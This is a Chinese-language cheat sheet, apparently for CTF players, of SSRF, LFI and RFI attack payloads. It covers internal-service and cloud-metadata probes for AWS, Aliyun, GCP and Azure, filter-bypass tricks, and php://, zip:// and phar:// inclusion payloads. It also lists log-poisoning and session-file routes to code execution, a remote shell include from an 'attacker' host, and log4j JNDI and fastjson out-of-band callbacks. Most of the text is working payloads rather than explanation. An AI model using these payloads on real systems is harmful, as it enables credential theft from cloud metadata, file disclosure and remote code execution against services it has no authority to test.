# SSRF / LFI / RFI

## SSRF 探测

```bash
# 自访问 + 内网试探
?url=http://127.0.0.1/
?url=http://127.0.0.1:6379/    # Redis
?url=http://localhost:8080/    # 内网管理面板
?url=http://169.254.169.254/   # 云元数据
?url=http://internal.svc/

# 协议绕过
?url=file:///etc/passwd
?url=dict://127.0.0.1:6379/info
?url=gopher://127.0.0.1:6379/_PING        # 构造 redis 命令
?url=ftp://attacker/                      # OOB
```

## 常见绕过

- 短链：`?url=https://bit.ly/xxx` 重定向到内网
- DNS rebinding：`*.rbndr.us`、`make-127-0-0-1-rr.attacker`
- 协议混淆：`?url=http://127.0.0.1#@evil/`
- 编码：`?url=http://127.1/`、`?url=http://2130706433/`（10进制 IP）
- 大小写绕过黑名单：`http://LocalHost`

## 云元数据（实战）

| 云 | URL |
|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| AWS Token | `http://169.254.169.254/latest/api/token`（IMDSv2 PUT） |
| Aliyun | `http://100.100.100.200/latest/meta-data/` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/`（需 `Metadata-Flavor: Google` 头） |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01`（需 `Metadata: true` 头） |

## LFI 探测

```bash
?file=../../../../etc/passwd
?file=php://filter/convert.base64-encode/resource=index.php
?file=expect://id            # 需要 expect 扩展
?file=zip://./uploaded.zip%23shell.php
?file=phar://uploaded.phar/shell.txt
```

## LFI → RCE 套路

| 套路 | 关键 |
|---|---|
| log poisoning | 写 PHP 到 `/var/log/apache2/access.log`（UA 可控）→ include 触发 |
| /proc/self/environ | UA 含 PHP 代码 → include `/proc/self/environ` |
| session 文件 | `/var/lib/php/sessions/sess_XXX` 包含可控 session 数据 |
| phar:// | 上传带元数据的 phar 文件触发反序列化 |
| pearcmd.php | PHP CLI 含 PEAR 时通过 LFI 调用 pearcmd 写文件 |

## RFI

PHP `allow_url_include=On` 时 `?file=http://attacker/shell.txt` 直接包含远程。

CTF 中：自起 `bg_run python3 -m http.server 8000` 提供 shell.txt。

## 文件读取后处理

PHP 源码先解码：
```bash
echo '<base64...>' | base64 -d > index.php
```
看 `include`/`require`/`file_get_contents` 找下个利用点。

## OOB DNS（外带）

题目无回显时尝试：
```
${jndi:ldap://你的回连/x}        # log4j
{"@type":"...","url":"http://x.dnslog.cn/y"}  # fastjson 等
```
本地用 `dnslog` 工具或 `tcpdump -i any port 53` 抓自建 DNS。
